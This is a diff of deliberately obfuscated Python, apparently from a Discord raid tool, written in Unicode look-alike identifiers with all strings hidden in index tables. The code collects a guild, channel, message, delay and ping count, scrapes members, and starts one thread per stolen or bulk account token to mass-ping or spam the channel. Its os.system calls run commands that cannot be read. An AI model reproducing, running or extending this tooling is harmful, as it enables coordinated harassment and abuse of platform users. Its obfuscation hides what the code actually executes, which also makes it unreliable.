-        𝗺𝗮𝘴𝘴 = 𝙞𝗻𝗽𝘶𝘁(f'{𝘳}{𝘕𝙈𝙈𝘔𝘕𝘭𝘭𝙈𝘔𝘭𝗠𝘔𝙉𝙡𝘐𝙈𝘐𝗜𝘕𝗠𝙄𝙄𝘔𝗜𝙡𝘐𝗡𝙄𝘔𝙄𝗜𝙈[98]}{𝗹𝙘}{𝘕𝙈𝗠𝗠𝘕𝘭𝗹𝘔𝗠𝘭𝙈𝘔𝗡𝙡𝙄𝘔𝗜𝗜𝗡𝙈𝘐𝗜𝙈𝗜𝘭𝗜𝙉𝗜𝙈𝗜𝗜𝘔[403]}{𝘭𝗰}{𝗿}{𝙉𝘔𝙈𝘔𝘕𝙡𝙡𝗠𝙈𝘭𝙈𝗠𝙉𝙡𝘐𝗠𝗜𝙄𝘕𝗠𝙄𝗜𝘔𝘐𝗹𝙄𝙉𝙄𝙈𝙄𝙄𝗠[100]}{𝘨}{𝗡𝘔𝗠𝘔𝘕𝘭𝙡𝗠𝘔𝘭𝘔𝙈𝘕𝘭𝙄𝙈𝙄𝗜𝘕𝘔𝗜𝘐𝗠𝘐𝘭𝙄𝘕𝙄𝘔𝘐𝗜𝗠[104]}{𝙧}{𝗡𝗠𝗠𝘔𝗡𝙡𝙡𝗠𝘔𝘭𝗠𝗠𝙉𝙡𝘐𝘔𝙄𝘐𝘕𝙈𝙄𝗜𝗠𝙄𝙡𝙄𝗡𝙄𝗠𝘐𝙄𝙈[404]}')
-        if 𝙢𝘢𝙨𝘴 == 𝙉𝙈𝘔𝙈𝙉𝗹𝘭𝗠𝘔𝙡𝗠𝘔𝙉𝗹𝙄𝙈𝗜𝘐𝙉𝙈𝗜𝘐𝗠𝘐𝘭𝗜𝘕𝗜𝘔𝙄𝗜𝙈[29]:
-            𝙈𝘦𝘯𝘂().main_menu()
-        𝗰𝙝𝗮𝙣𝗻𝙚𝘭 = 𝗶𝘯𝗽𝘶𝘵(f'{𝗿}{𝘕𝙈𝘔𝘔𝘕𝘭𝙡𝙈𝗠𝘭𝗠𝘔𝗡𝘭𝙄𝘔𝙄𝘐𝘕𝘔𝙄𝙄𝙈𝘐𝙡𝗜𝗡𝙄𝙈𝗜𝘐𝗠[98]}{𝗹𝘤}{𝙉𝙈𝘔𝗠𝘕𝙡𝙡𝘔𝙈𝘭𝗠𝙈𝗡𝘭𝗜𝗠𝙄𝘐𝙉𝙈𝙄𝘐𝙈𝙄𝗹𝗜𝘕𝗜𝗠𝗜𝗜𝘔[380]}{𝙡𝙘}{𝘳}{𝗡𝗠𝘔𝘔𝗡𝘭𝘭𝙈𝙈𝙡𝘔𝙈𝗡𝘭𝙄𝘔𝘐𝘐𝗡𝙈𝗜𝗜𝙈𝗜𝙡𝗜𝗡𝗜𝗠𝗜𝙄𝙈[100]}{𝗿}{𝙉𝙈𝘔𝘔𝗡𝙡𝗹𝙈𝘔𝘭𝘔𝗠𝘕𝘭𝘐𝘔𝘐𝘐𝘕𝗠𝘐𝙄𝗠𝗜𝘭𝗜𝗡𝘐𝗠𝘐𝗜𝙈[405]}')
-        if 𝙘𝘩𝘢𝘯𝘯𝙚𝘭 == 𝘕𝗠𝙈𝙈𝗡𝘭𝗹𝗠𝙈𝗹𝗠𝗠𝘕𝗹𝙄𝗠𝘐𝗜𝗡𝙈𝘐𝘐𝘔𝘐𝘭𝙄𝘕𝗜𝙈𝗜𝗜𝙈[29]:
-            𝙈𝘦𝙣𝘶().main_menu()
-        𝙢𝘦𝘀𝙨𝗮𝗴𝘦 = 𝙞𝙣𝘱𝘶𝘵(f'{𝘳}{𝘕𝙈𝙈𝘔𝗡𝗹𝗹𝗠𝘔𝗹𝙈𝗠𝙉𝘭𝙄𝘔𝙄𝘐𝘕𝘔𝙄𝗜𝘔𝗜𝘭𝗜𝘕𝘐𝙈𝘐𝙄𝘔[98]}{𝙡𝗰}{𝘕𝗠𝘔𝗠𝘕𝙡𝗹𝗠𝙈𝘭𝙈𝘔𝙉𝙡𝘐𝘔𝘐𝗜𝗡𝘔𝗜𝗜𝗠𝙄𝘭𝗜𝗡𝙄𝘔𝗜𝙄𝘔[382]}{𝗹𝙘}{𝙧}{𝙉𝙈𝗠𝙈𝗡𝘭𝙡𝘔𝗠𝘭𝙈𝘔𝙉𝙡𝗜𝙈𝗜𝘐𝗡𝙈𝗜𝗜𝘔𝙄𝘭𝘐𝘕𝗜𝘔𝘐𝗜𝘔[100]}{𝙧}{𝘕𝙈𝗠𝙈𝘕𝙡𝘭𝗠𝗠𝗹𝗠𝗠𝙉𝗹𝙄𝙈𝗜𝗜𝘕𝘔𝗜𝘐𝘔𝗜𝘭𝗜𝘕𝘐𝙈𝘐𝘐𝘔[405]}')
-        if 𝘮𝘦𝙨𝙨𝙖𝗴𝘦 == 𝗡𝗠𝙈𝙈𝙉𝗹𝙡𝙈𝗠𝙡𝘔𝘔𝙉𝘭𝘐𝗠𝙄𝙄𝗡𝘔𝙄𝙄𝗠𝗜𝘭𝗜𝙉𝗜𝘔𝘐𝗜𝙈[29]:
-            𝘔𝗲𝘯𝙪().main_menu()
-        𝘥𝗲𝗹𝙖𝘺 = 𝘮6𝗔𝗭𝙬𝙞𝘏4𝗥𝙄2𝘓𝗴𝙙𝙬_𝗗𝘶𝘴𝘏𝙤𝙡𝗬𝙚𝗖𝙧𝘚6𝙛𝙪𝘔𝙚.mro()[9](𝘪𝗻𝗽𝘶𝘁(f'{𝘳}{𝙉𝗠𝙈𝙈𝗡𝗹𝙡𝘔𝙈𝘭𝗠𝙈𝗡𝗹𝗜𝙈𝗜𝙄𝙉𝗠𝙄𝘐𝗠𝙄𝗹𝙄𝙉𝘐𝘔𝗜𝘐𝘔[98]}{𝘭𝗰}{𝘕𝙈𝗠𝘔𝗡𝗹𝘭𝗠𝘔𝗹𝙈𝘔𝙉𝘭𝙄𝘔𝘐𝙄𝘕𝗠𝗜𝗜𝙈𝗜𝘭𝙄𝙉𝘐𝙈𝙄𝗜𝙈[406]}{𝘭𝘤}{𝗿}{𝙉𝗠𝙈𝙈𝘕𝘭𝘭𝘔𝗠𝗹𝘔𝗠𝗡𝗹𝙄𝘔𝘐𝙄𝙉𝘔𝘐𝘐𝗠𝗜𝙡𝗜𝗡𝗜𝙈𝙄𝘐𝘔[100]}{𝘳}{𝘕𝘔𝗠𝙈𝗡𝗹𝘭𝙈𝙈𝘭𝗠𝙈𝗡𝘭𝙄𝙈𝙄𝘐𝙉𝗠𝙄𝘐𝙈𝘐𝗹𝗜𝘕𝗜𝙈𝙄𝘐𝘔[405]}'))
-        if 𝗱𝗲𝘭𝗮𝘆 == 𝘕𝘔𝗠𝗠𝘕𝙡𝘭𝗠𝘔𝘭𝘔𝙈𝘕𝘭𝘐𝙈𝗜𝘐𝘕𝘔𝗜𝙄𝗠𝙄𝙡𝗜𝘕𝙄𝘔𝘐𝗜𝘔[29]:
-            𝙈𝗲𝗻𝙪().main_menu()
-        if 𝗺𝙖𝙨𝙨 == 𝙉𝙈𝗠𝙈𝗡𝗹𝘭𝘔𝘔𝙡𝗠𝙈𝙉𝗹𝘐𝘔𝗜𝙄𝗡𝙈𝙄𝙄𝗠𝘐𝙡𝗜𝙉𝙄𝙈𝘐𝗜𝙈[407]:
-            𝘨𝙪𝗶𝗹𝘥𝘪𝗱 = 𝙞𝙣𝙥𝘶𝘵(f'{𝗿}{𝘕𝗠𝗠𝘔𝘕𝘭𝘭𝘔𝘔𝘭𝙈𝙈𝗡𝗹𝙄𝙈𝗜𝘐𝘕𝘔𝘐𝙄𝘔𝗜𝗹𝙄𝘕𝘐𝙈𝗜𝙄𝘔[98]}{𝗹𝙘}{𝘕𝗠𝙈𝗠𝗡𝗹𝘭𝘔𝙈𝙡𝙈𝘔𝘕𝗹𝙄𝙈𝙄𝙄𝘕𝙈𝙄𝙄𝘔𝙄𝘭𝘐𝘕𝘐𝗠𝘐𝙄𝗠[386]}{𝙧}{𝘕𝙈𝙈𝙈𝗡𝘭𝙡𝗠𝘔𝗹𝗠𝙈𝗡𝗹𝙄𝘔𝘐𝘐𝘕𝘔𝘐𝙄𝗠𝙄𝘭𝗜𝘕𝘐𝗠𝘐𝘐𝘔[372]}')
-            if 𝘨𝘶𝘪𝙡𝗱𝙞𝘥 == 𝗡𝘔𝙈𝗠𝘕𝙡𝘭𝗠𝙈𝙡𝙈𝙈𝗡𝘭𝗜𝗠𝗜𝙄𝘕𝙈𝙄𝗜𝙈𝗜𝙡𝗜𝘕𝘐𝗠𝗜𝙄𝙈[29]:
-                𝘔𝘦𝙣𝙪().main_menu()
-            𝙥𝘪𝘯𝗴𝘴 = 𝘩𝘄𝘠𝙔𝙤𝘞𝙛𝗜𝘺𝗴8𝘖𝘩𝙢𝙙𝙯02𝙏𝙊𝗚𝗲𝙊8𝗬𝗨𝘩𝗴𝘨𝗩𝙠𝘪.mro()[5](𝘪𝙣𝗽𝙪𝘁(f'{𝘳}{𝘕𝘔𝗠𝗠𝗡𝗹𝘭𝘔𝙈𝘭𝗠𝙈𝙉𝗹𝙄𝗠𝗜𝘐𝙉𝘔𝙄𝗜𝗠𝗜𝙡𝙄𝗡𝗜𝘔𝗜𝗜𝘔[98]}{𝘭𝘤}{𝘕𝙈𝗠𝗠𝙉𝙡𝗹𝙈𝙈𝙡𝙈𝙈𝙉𝘭𝘐𝗠𝙄𝙄𝘕𝙈𝘐𝙄𝘔𝙄𝗹𝙄𝗡𝙄𝙈𝙄𝘐𝗠[408]}{𝗹𝙘}{𝙧}{𝙉𝙈𝘔𝙈𝘕𝗹𝘭𝗠𝘔𝗹𝘔𝘔𝗡𝘭𝗜𝘔𝗜𝙄𝘕𝙈𝘐𝘐𝙈𝘐𝙡𝙄𝙉𝘐𝘔𝙄𝘐𝘔[372]}'))
-            if 𝘱𝘪𝗻𝗴𝘴 == 𝙉𝙈𝙈𝙈𝗡𝗹𝙡𝗠𝘔𝘭𝘔𝘔𝘕𝘭𝙄𝗠𝗜𝗜𝗡𝙈𝗜𝙄𝙈𝗜𝙡𝘐𝗡𝙄𝘔𝙄𝘐𝗠[29]:
-                𝙈𝘦𝘯𝙪().main_menu()
-            𝘱𝙧𝗶𝗻𝘁(f'{𝙧}{𝗡𝙈𝙈𝘔𝘕𝗹𝘭𝘔𝙈𝗹𝗠𝘔𝗡𝗹𝘐𝘔𝘐𝗜𝙉𝙈𝗜𝙄𝙈𝘐𝗹𝘐𝘕𝗜𝗠𝙄𝘐𝙈[98]}{𝙡𝗰}{𝗡𝗠𝙈𝗠𝗡𝙡𝘭𝘔𝗠𝙡𝘔𝘔𝘕𝗹𝘐𝗠𝘐𝗜𝗡𝘔𝗜𝗜𝘔𝗜𝙡𝙄𝙉𝘐𝗠𝙄𝙄𝗠[409]}{𝙡𝗰}{𝘳}{𝙉𝘔𝘔𝙈𝘕𝙡𝗹𝙈𝘔𝙡𝘔𝙈𝘕𝗹𝙄𝙈𝗜𝗜𝙉𝙈𝙄𝘐𝙈𝙄𝘭𝘐𝗡𝗜𝙈𝙄𝘐𝙈[100]}{𝘨}{𝗡𝙈𝗠𝗠𝘕𝗹𝗹𝗠𝘔𝗹𝗠𝘔𝗡𝘭𝘐𝙈𝙄𝗜𝙉𝗠𝘐𝙄𝗠𝙄𝗹𝘐𝘕𝙄𝙈𝗜𝘐𝗠[410]}')
-            𝙨𝙘𝘳𝙖𝗽𝙚𝙧(𝗴𝙪𝘪𝘭𝗱𝙞𝗱, 𝗰𝘩𝘢𝗻𝘯𝘦𝙡)
-            𝗼𝘀.system(𝗡𝙈𝙈𝗠𝘕𝘭𝙡𝗠𝗠𝙡𝗠𝘔𝘕𝗹𝙄𝗠𝘐𝘐𝗡𝙈𝗜𝙄𝙈𝘐𝗹𝗜𝗡𝘐𝗠𝙄𝗜𝙈[1])
-            𝙥𝙧𝙞𝘯𝘵(𝙢𝗲𝙣𝙪)
-            for 𝙩𝙤𝘬𝙚𝙣 in 𝘁𝘰𝗸𝗲𝗻𝙨:
-                𝙩𝗵𝘳𝘦𝗮𝘥𝙞𝗻𝙜.Thread(target=𝗺𝘢𝙨𝘴𝗽𝘪𝗻𝘨, args=(𝘁𝙤𝗸𝗲𝙣, 𝘤𝘩𝙖𝙣𝘯𝙚𝗹, 𝗺𝘦𝘴𝘀𝘢𝘨𝗲, 𝙙𝗲𝗹𝗮𝘆, 𝘱𝗶𝙣𝗴𝘀)).start()
-            𝗲𝘅𝙞𝙩 = 𝙞𝘯𝙥𝘶𝘁(𝘕𝗠𝙈𝘔𝙉𝙡𝘭𝙈𝙈𝘭𝘔𝗠𝘕𝘭𝘐𝙈𝘐𝗜𝙉𝙈𝘐𝘐𝗠𝘐𝗹𝗜𝘕𝘐𝘔𝗜𝘐𝘔[29])
-            𝗲𝘅𝙞𝙩 = 𝗠𝘦𝘯𝘂().main_menu()
-            𝗲𝘅𝗶𝘁()
-        if 𝙢𝙖𝘀𝙨 == 𝘕𝗠𝙈𝘔𝘕𝗹𝗹𝗠𝗠𝙡𝗠𝗠𝗡𝙡𝘐𝗠𝙄𝗜𝙉𝙈𝙄𝙄𝙈𝗜𝘭𝙄𝗡𝗜𝘔𝙄𝘐𝗠[411]:
-            𝙤𝘴.system(𝙉𝙈𝗠𝙈𝙉𝘭𝘭𝗠𝘔𝙡𝘔𝙈𝘕𝙡𝗜𝙈𝘐𝘐𝘕𝙈𝘐𝘐𝙈𝙄𝗹𝗜𝙉𝘐𝙈𝗜𝙄𝘔[1])
-            𝗽𝙧𝘪𝘯𝙩(𝗺𝙚𝘯𝘶)
-            for 𝘵𝗼𝗸𝗲𝙣 in 𝘵𝙤𝘬𝙚𝗻𝘀:
-                𝙩𝗵𝘳𝘦𝗮𝘥𝙞𝙣𝘨.Thread(target=𝘀𝗽𝘢𝗺𝘮𝗲𝗿, args=(𝘁𝘰𝘬𝙚𝘯, 𝘤𝗵𝙖𝘯𝘯𝘦𝘭, 𝙢𝙚𝘀𝘀𝘢𝗴𝗲, 𝙙𝙚𝘭𝗮𝘺)).start()
-            𝙚𝘹𝙞𝘁 = 𝗶𝘯𝘱𝘶𝘁(𝗡𝗠𝙈𝙈𝗡𝗹𝘭𝗠𝗠𝘭𝙈𝗠𝘕𝙡𝗜𝘔𝙄𝙄𝙉𝗠𝙄𝗜𝗠𝘐𝘭𝙄𝘕𝙄𝙈𝙄𝘐𝙈[29])
-            𝘦𝘅𝘪𝙩 = 𝗠𝗲𝘯𝙪().main_menu()
-            𝙚𝙭𝙞𝘵()
+        𝘰𝘴.system(𝙄𝘕𝙄𝙉𝙡𝘭𝙄𝙈𝘐𝘐𝙡𝘔𝗹𝗹𝗜𝗹𝙡𝗡𝗡𝘐𝗹𝘭𝙈𝘕𝗹𝗡𝙡𝗠𝙄𝗠𝗜𝘔[395])
+        𝗺𝙖𝘴𝘀 = 𝘪𝗻𝗽𝙪𝙩(f'{𝘳}{𝗜𝗡𝗜𝘕𝘭𝗹𝘐𝘔𝘐𝘐𝗹𝗠𝘭𝗹𝘐𝗹𝘭𝙉𝘕𝘐𝗹𝘭𝙈𝘕𝙡𝙉𝗹𝗠𝗜𝙈𝗜𝗠[91]}{𝘭𝙘}{𝙄𝗡𝘐𝗡𝙡𝙡𝙄𝙈𝗜𝙄𝘭𝘔𝘭𝗹𝗜𝗹𝗹𝙉𝘕𝗜𝙡𝘭𝘔𝙉𝗹𝘕𝗹𝗠𝙄𝘔𝗜𝘔[396]}{𝙡𝙘}{𝙧}{𝘐𝘕𝘐𝗡𝗹𝗹𝙄𝙈𝗜𝘐𝘭𝘔𝘭𝙡𝙄𝙡𝙡𝙉𝗡𝗜𝘭𝗹𝙈𝗡𝘭𝙉𝘭𝘔𝙄𝗠𝙄𝙈[93]}{𝗴}{𝗜𝙉𝗜𝙉𝘭𝙡𝗜𝗠𝗜𝙄𝘭𝗠𝙡𝙡𝗜𝗹𝙡𝘕𝗡𝗜𝙡𝗹𝘔𝙉𝗹𝙉𝗹𝘔𝘐𝗠𝗜𝙈[97]}{𝘳}{𝘐𝘕𝙄𝗡𝘭𝙡𝙄𝗠𝗜𝗜𝗹𝙈𝗹𝗹𝘐𝘭𝗹𝗡𝘕𝗜𝙡𝙡𝘔𝘕𝘭𝙉𝗹𝙈𝗜𝙈𝘐𝗠[397]}')
+        if 𝘮𝘢𝙨𝘀 == 𝗜𝗡𝙄𝙉𝘭𝗹𝗜𝗠𝗜𝙄𝗹𝘔𝘭𝗹𝘐𝙡𝘭𝘕𝘕𝗜𝘭𝘭𝙈𝙉𝙡𝘕𝗹𝘔𝙄𝘔𝙄𝙈[22]:
+            𝘔𝙚𝗻𝘶().main_menu()
+        𝗰𝙝𝙖𝗻𝘯𝘦𝙡 = 𝘪𝘯𝘱𝘂𝙩(f'{𝘳}{𝘐𝙉𝙄𝘕𝙡𝙡𝙄𝙈𝙄𝗜𝗹𝙈𝘭𝙡𝙄𝙡𝘭𝘕𝗡𝙄𝘭𝘭𝙈𝙉𝗹𝗡𝘭𝙈𝗜𝗠𝗜𝙈[91]}{𝘭𝘤}{𝘐𝙉𝙄𝗡𝗹𝘭𝙄𝗠𝙄𝘐𝙡𝗠𝗹𝙡𝙄𝗹𝗹𝘕𝘕𝘐𝙡𝘭𝙈𝗡𝙡𝘕𝘭𝙈𝙄𝗠𝘐𝘔[373]}{𝙡𝙘}{𝗿}{𝙄𝙉𝗜𝘕𝘭𝘭𝙄𝙈𝗜𝙄𝗹𝗠𝗹𝗹𝗜𝗹𝘭𝙉𝘕𝗜𝙡𝙡𝘔𝗡𝗹𝗡𝙡𝗠𝘐𝘔𝘐𝗠[93]}{𝗿}{𝘐𝗡𝙄𝙉𝗹𝗹𝘐𝘔𝘐𝘐𝙡𝙈𝘭𝘭𝘐𝙡𝗹𝘕𝘕𝗜𝙡𝘭𝘔𝗡𝘭𝙉𝘭𝙈𝗜𝙈𝗜𝙈[398]}')
+        if 𝗰𝘩𝙖𝙣𝘯𝙚𝘭 == 𝗜𝙉𝙄𝗡𝙡𝗹𝘐𝘔𝙄𝗜𝙡𝗠𝘭𝘭𝙄𝙡𝙡𝘕𝘕𝘐𝘭𝗹𝗠𝗡𝘭𝙉𝗹𝙈𝙄𝗠𝗜𝗠[22]:
+            𝙈𝘦𝙣𝙪().main_menu()
+        𝗺𝙚𝘀𝘀𝙖𝘨𝘦 = 𝙞𝙣𝙥𝙪𝘁(f'{𝘳}{𝙄𝘕𝙄𝗡𝙡𝘭𝗜𝗠𝗜𝗜𝘭𝘔𝙡𝙡𝘐𝗹𝘭𝙉𝗡𝘐𝘭𝙡𝗠𝘕𝘭𝙉𝗹𝘔𝙄𝙈𝗜𝘔[91]}{𝙡𝘤}{𝗜𝘕𝘐𝘕𝗹𝘭𝘐𝗠𝘐𝘐𝗹𝘔𝙡𝗹𝙄𝘭𝙡𝙉𝙉𝙄𝗹𝘭𝙈𝗡𝘭𝙉𝘭𝗠𝗜𝙈𝗜𝘔[375]}{𝗹𝗰}{𝗿}{𝘐𝙉𝘐𝙉𝙡𝘭𝙄𝗠𝘐𝘐𝗹𝙈𝘭𝙡𝗜𝗹𝗹𝙉𝘕𝘐𝗹𝘭𝙈𝘕𝙡𝘕𝙡𝗠𝙄𝙈𝘐𝗠[93]}{𝘳}{𝗜𝗡𝙄𝗡𝘭𝘭𝘐𝘔𝗜𝙄𝗹𝙈𝗹𝗹𝘐𝙡𝗹𝗡𝘕𝙄𝘭𝗹𝘔𝗡𝗹𝗡𝗹𝗠𝙄𝘔𝗜𝙈[398]}')
+        if 𝙢𝗲𝘴𝘀𝗮𝗴𝙚 == 𝗜𝗡𝙄𝙉𝘭𝗹𝙄𝘔𝙄𝗜𝗹𝗠𝘭𝙡𝘐𝗹𝗹𝘕𝙉𝗜𝗹𝗹𝗠𝙉𝘭𝗡𝙡𝘔𝘐𝘔𝗜𝗠[22]:
+            𝗠𝙚𝘯𝘂().main_menu()
+        𝗱𝗲𝗹𝗮𝘆 = 𝘚𝘰𝘸𝙀5𝗝𝘚3𝙥𝗗𝘑𝗚𝘔𝗹𝙆𝘤𝘡𝘨𝗵7𝘠𝘻𝗼𝘩𝗨4𝙒_𝙦𝘎𝙄𝗡.mro()[9](𝘪𝗻𝘱𝙪𝘵(f'{𝗿}{𝘐𝘕𝗜𝙉𝙡𝘭𝗜𝗠𝙄𝙄𝗹𝘔𝗹𝗹𝗜𝙡𝗹𝙉𝘕𝗜𝘭𝘭𝗠𝘕𝘭𝗡𝘭𝘔𝗜𝗠𝘐𝙈[91]}{𝗹𝘤}{𝗜𝗡𝗜𝙉𝘭𝗹𝘐𝙈𝗜𝘐𝙡𝘔𝘭𝙡𝙄𝘭𝙡𝙉𝙉𝘐𝙡𝗹𝘔𝙉𝘭𝙉𝗹𝙈𝗜𝙈𝙄𝘔[399]}{𝘭𝙘}{𝗿}{𝙄𝘕𝘐𝙉𝗹𝘭𝙄𝘔𝙄𝘐𝘭𝘔𝙡𝙡𝘐𝙡𝙡𝗡𝘕𝙄𝗹𝘭𝙈𝙉𝙡𝘕𝙡𝗠𝗜𝙈𝗜𝘔[93]}{𝘳}{𝘐𝘕𝗜𝙉𝗹𝙡𝗜𝘔𝗜𝙄𝙡𝘔𝙡𝘭𝗜𝗹𝘭𝗡𝗡𝘐𝘭𝗹𝘔𝗡𝙡𝘕𝗹𝘔𝙄𝙈𝙄𝗠[398]}'))
+        if 𝗱𝗲𝘭𝘢𝘆 == 𝙄𝗡𝗜𝙉𝙡𝙡𝗜𝗠𝘐𝗜𝗹𝙈𝗹𝗹𝙄𝙡𝗹𝗡𝘕𝗜𝘭𝙡𝙈𝘕𝘭𝗡𝗹𝙈𝗜𝗠𝘐𝙈[22]:
+            𝘔𝘦𝙣𝘂().main_menu()
+        if 𝙢𝘢𝘴𝘴 == 𝙄𝙉𝗜𝗡𝙡𝘭𝘐𝘔𝘐𝙄𝘭𝙈𝙡𝙡𝙄𝙡𝙡𝙉𝗡𝘐𝘭𝗹𝘔𝘕𝗹𝗡𝙡𝗠𝙄𝘔𝙄𝗠[400]:
+            𝗴𝘂𝘪𝙡𝘥𝗶𝘥 = 𝗶𝗻𝙥𝘶𝘁(f'{𝙧}{𝗜𝗡𝗜𝙉𝘭𝗹𝙄𝙈𝗜𝘐𝘭𝗠𝗹𝗹𝗜𝙡𝙡𝘕𝙉𝙄𝗹𝙡𝙈𝘕𝗹𝗡𝗹𝙈𝘐𝘔𝘐𝙈[91]}{𝗹𝙘}{𝙄𝗡𝗜𝘕𝗹𝗹𝗜𝙈𝘐𝘐𝘭𝗠𝘭𝘭𝗜𝗹𝙡𝘕𝘕𝘐𝘭𝙡𝗠𝙉𝘭𝗡𝙡𝗠𝗜𝗠𝘐𝗠[379]}{𝘳}{𝗜𝗡𝘐𝘕𝗹𝘭𝗜𝘔𝗜𝗜𝗹𝘔𝙡𝙡𝘐𝙡𝗹𝘕𝗡𝙄𝘭𝙡𝗠𝗡𝘭𝙉𝗹𝘔𝘐𝙈𝙄𝗠[365]}')
+            if 𝘨𝙪𝙞𝗹𝗱𝗶𝙙 == 𝘐𝗡𝗜𝙉𝙡𝙡𝘐𝗠𝙄𝘐𝙡𝘔𝘭𝗹𝙄𝙡𝙡𝙉𝘕𝘐𝙡𝙡𝗠𝙉𝘭𝙉𝘭𝙈𝗜𝙈𝙄𝗠[22]:
+                𝙈𝗲𝘯𝘶().main_menu()
+            𝗽𝗶𝘯𝙜𝘀 = 𝗡𝘵1𝗰𝗖4𝘒𝘈3𝙓𝘉𝙋𝘻𝗚𝙔62𝗪𝙍𝘒𝙣𝗘𝗶𝗘𝘩𝘇𝘳𝗶𝙉2𝗻𝘳.mro()[9](𝗶𝗻𝗽𝘶𝙩(f'{𝗿}{𝗜𝗡𝗜𝗡𝙡𝗹𝙄𝗠𝙄𝗜𝘭𝗠𝘭𝗹𝙄𝗹𝘭𝘕𝙉𝘐𝘭𝘭𝙈𝘕𝘭𝗡𝗹𝘔𝙄𝘔𝙄𝗠[91]}{𝙡𝘤}{𝘐𝗡𝘐𝙉𝙡𝙡𝘐𝗠𝙄𝘐𝘭𝙈𝙡𝘭𝘐𝘭𝘭𝙉𝙉𝗜𝗹𝗹𝘔𝙉𝙡𝘕𝗹𝙈𝙄𝗠𝗜𝙈[401]}{𝗹𝗰}{𝙧}{𝙄𝘕𝗜𝗡𝗹𝘭𝙄𝘔𝗜𝘐𝗹𝙈𝙡𝙡𝘐𝘭𝘭𝙉𝗡𝙄𝘭𝙡𝘔𝗡𝘭𝘕𝗹𝙈𝗜𝘔𝗜𝘔[365]}'))
+            if 𝙥𝘪𝘯𝙜𝘀 == 𝙄𝗡𝗜𝙉𝙡𝗹𝘐𝙈𝘐𝘐𝙡𝘔𝘭𝘭𝘐𝙡𝙡𝘕𝗡𝙄𝗹𝘭𝙈𝘕𝘭𝘕𝘭𝙈𝗜𝘔𝘐𝗠[22]:
+                𝘔𝗲𝗻𝙪().main_menu()
+            𝗽𝘳𝘪𝘯𝘵(f'{𝗿}{𝙄𝙉𝙄𝗡𝙡𝙡𝙄𝗠𝙄𝗜𝗹𝗠𝘭𝙡𝙄𝘭𝘭𝘕𝗡𝙄𝙡𝘭𝙈𝗡𝙡𝘕𝘭𝙈𝙄𝘔𝘐𝘔[91]}{𝙡𝙘}{𝙄𝗡𝗜𝘕𝘭𝘭𝘐𝙈𝗜𝗜𝗹𝗠𝙡𝘭𝙄𝙡𝗹𝙉𝙉𝘐𝘭𝙡𝙈𝙉𝙡𝗡𝘭𝘔𝗜𝘔𝗜𝙈[402]}{𝗹𝙘}{𝗿}{𝙄𝙉𝙄𝗡𝘭𝗹𝙄𝙈𝗜𝘐𝘭𝙈𝙡𝙡𝙄𝗹𝙡𝗡𝙉𝘐𝙡𝙡𝘔𝙉𝗹𝗡𝗹𝙈𝗜𝘔𝙄𝙈[93]}{𝙜}{𝘐𝗡𝙄𝘕𝙡𝙡𝗜𝘔𝗜𝘐𝘭𝘔𝙡𝘭𝗜𝘭𝗹𝙉𝙉𝙄𝗹𝗹𝙈𝗡𝘭𝗡𝗹𝗠𝗜𝗠𝘐𝙈[403]}')
+            𝘴𝗰𝘳𝙖𝙥𝙚𝗿(𝘨𝘶𝗶𝘭𝙙𝗶𝗱, 𝙘𝘩𝙖𝙣𝘯𝗲𝘭)
+            𝗼𝙨.system(𝙄𝘕𝘐𝘕𝗹𝙡𝘐𝘔𝙄𝗜𝘭𝗠𝘭𝘭𝙄𝙡𝗹𝙉𝘕𝘐𝗹𝗹𝗠𝗡𝘭𝗡𝗹𝙈𝘐𝗠𝙄𝗠[1])
+            𝗽𝙧𝘪𝘯𝘵(𝙢𝙚𝙣𝘂)
+            for 𝙩𝘰𝙠𝗲𝗻 in 𝙩𝘰𝘬𝘦𝗻𝘀:
+                𝘁𝗵𝗿𝗲𝙖𝘥𝙞𝗻𝗴.Thread(target=𝗺𝙖𝘀𝙨𝘱𝙞𝘯𝗴, args=(𝙩𝗼𝘬𝗲𝙣, 𝙘𝙝𝗮𝗻𝙣𝙚𝘭, 𝘮𝙚𝘀𝙨𝗮𝘨𝙚, 𝘥𝗲𝙡𝘢𝘆, 𝙥𝘪𝙣𝗴𝘴)).start()
+            𝘦𝘹𝘪𝘵 = 𝗶𝘯𝙥𝙪𝘁(𝗜𝘕𝙄𝙉𝙡𝗹𝗜𝗠𝙄𝘐𝗹𝗠𝙡𝙡𝙄𝙡𝙡𝙉𝘕𝗜𝗹𝙡𝘔𝘕𝗹𝘕𝗹𝙈𝘐𝗠𝙄𝗠[22])
+            𝘦𝘹𝘪𝘵 = 𝙈𝘦𝗻𝙪().main_menu()
+            𝗲𝙭𝘪𝘁()
+        if 𝙢𝙖𝙨𝘀 == 𝙄𝗡𝙄𝙉𝗹𝗹𝙄𝙈𝙄𝙄𝙡𝘔𝙡𝙡𝙄𝘭𝙡𝘕𝘕𝘐𝙡𝘭𝗠𝗡𝙡𝗡𝗹𝘔𝙄𝗠𝘐𝘔[404]:
+            𝘰𝘴.system(𝗜𝗡𝙄𝘕𝙡𝗹𝘐𝙈𝗜𝗜𝙡𝙈𝘭𝗹𝗜𝙡𝘭𝘕𝗡𝙄𝘭𝗹𝙈𝙉𝙡𝙉𝙡𝙈𝙄𝗠𝙄𝘔[1])
+            𝗽𝘳𝘪𝙣𝙩(𝘮𝘦𝗻𝙪)
+            for 𝙩𝗼𝙠𝙚𝙣 in 𝙩𝗼𝘬𝘦𝙣𝘀:
+                𝘁𝗵𝙧𝗲𝙖𝘥𝘪𝙣𝘨.Thread(target=𝙨𝘱𝗮𝗺𝘮𝗲𝘳, args=(𝙩𝗼𝙠𝘦𝗻, 𝘤𝘩𝙖𝙣𝘯𝙚𝘭, 𝘮𝘦𝘴𝘴𝘢𝗴𝙚, 𝙙𝙚𝘭𝗮𝙮)).start()
+            𝗲𝘅𝘪𝘁 = 𝘪𝙣𝙥𝘂𝙩(𝗜𝗡𝘐𝗡𝘭𝘭𝘐𝙈𝙄𝙄𝙡𝙈𝗹𝗹𝗜𝘭𝙡𝙉𝗡𝗜𝙡𝘭𝙈𝙉𝗹𝘕𝗹𝙈𝙄𝗠𝙄𝘔[22])
+            𝗲𝙭𝘪𝘁 = 𝘔𝗲𝘯𝘶().main_menu()
+            𝙚𝘅𝘪𝙩()
 
-    @𝙬𝘳𝙖𝗽𝗽𝙚𝘳
+    @𝘄𝙧𝗮𝙥𝗽𝘦𝗿
     def exit(self):
-        𝗼𝘴.system(𝗡𝗠𝗠𝙈𝘕𝘭𝗹𝙈𝙈𝘭𝙈𝗠𝙉𝗹𝘐𝙈𝗜𝗜𝘕𝙈𝘐𝘐𝙈𝙄𝘭𝙄𝙉𝙄𝙈𝘐𝗜𝗠[1])
